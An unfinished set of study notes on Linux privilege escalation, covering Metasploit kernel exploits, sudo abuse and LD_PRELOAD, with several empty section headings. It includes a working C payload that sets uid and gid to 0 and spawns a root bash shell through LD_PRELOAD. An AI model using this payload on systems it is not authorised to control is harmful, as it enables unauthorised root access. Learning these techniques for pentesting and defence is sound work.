
## Kernel exploits
Metasploit has exploits that allow privileged escalation.
- Find the kernel version using **uname -r**
- Search for an exploit that works for the kernel version
- Run the exploit 


## Sudo
You can use ```https://gtfobins.org/``` to check what applications might bypass sudo permissions and lead to priviledge escalation.

*You can see what sudo permissions you have available with* **sudo -l** 

### LD_PRELOAD
Using **sudo -l** you an option may be avaiable called ```env_keep+=LD_PRELOAD``` which is another possible priviledge escalation.

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```


## SUID




## Capabilities





## Crone jobs





## Path





## NFS
